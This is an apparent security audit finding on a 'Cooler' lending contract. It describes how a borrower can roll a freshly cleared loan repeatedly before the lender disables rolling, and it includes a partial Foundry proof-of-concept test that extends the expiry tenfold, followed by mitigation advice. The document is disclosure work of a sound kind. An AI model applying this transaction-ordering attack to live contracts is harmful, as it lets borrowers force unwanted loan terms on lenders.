# Borrower can inject `roll` transactions between `clear` and `toggleRoll`

## Summary
Since `rollable` is by default true for all loan positions, attacker can immediately act after the `clear` transaction to `roll` as many times he needs.

## Vulnerability Detail
When a lender wants to clear a position and calls the clear function with enough allowance for the contract, the related request for borrow clears and the money gets transferred from the lender to the borrower. However, the `rollable` value is `true` by default which allows anyone in the network, specifically the `owner` of the `Cooler` contract to act and roll as many times as needed. This way, the owner of the contract can have an "Option" to trade any amounts of loan with collateral for an arbitrary amount of time. In finance, an option position should be bought by an agreement between two parties but here, borrower can force this option to the lender immediately after the clear transaction.

        token2.approve(address(cooler), 100 ether);
        uint256 loanID = cooler.clear(reqID); // Victim clear transaction

        vm.stopPrank();

        /**
         * Attacker manipulates orderings so he can inject his own roll transactions between clear and toggelroll
         */

        assertFalse(cooler.isActive(reqID)); // Request is cleared and loan is in place

        assertEq(cooler.getExpiryOf(loanID), duration + timestamp); // getExpiryOf is an added getter function for test purposes, it fetches the expiry value of a loanID
        
        vm.startPrank(attacker);
        for(uint256 i; i < 10; ++i){
            cooler.roll(loanID);
        }
        vm.stopPrank();

        assertEq(cooler.getExpiryOf(loanID), duration * 10 + duration + timestamp);
        /**
         * Injection ends
         */

        vm.prank(victim);
        cooler.toggleRoll(loanID); // Does not matter anymore
    }
}
```

## Tool used

Manual Review

## Recommendation
It would be a good idea to limit the borrower to be able to roll at most once or `MAX_ROLL_ATTEMPTS` inside each `duration`.
Lender should be able to set the default value for the `rollable`. Otherwise, lender needs to use a contract like `ClearingHouse` that calls `clear` and `toggleRoll` atomically.
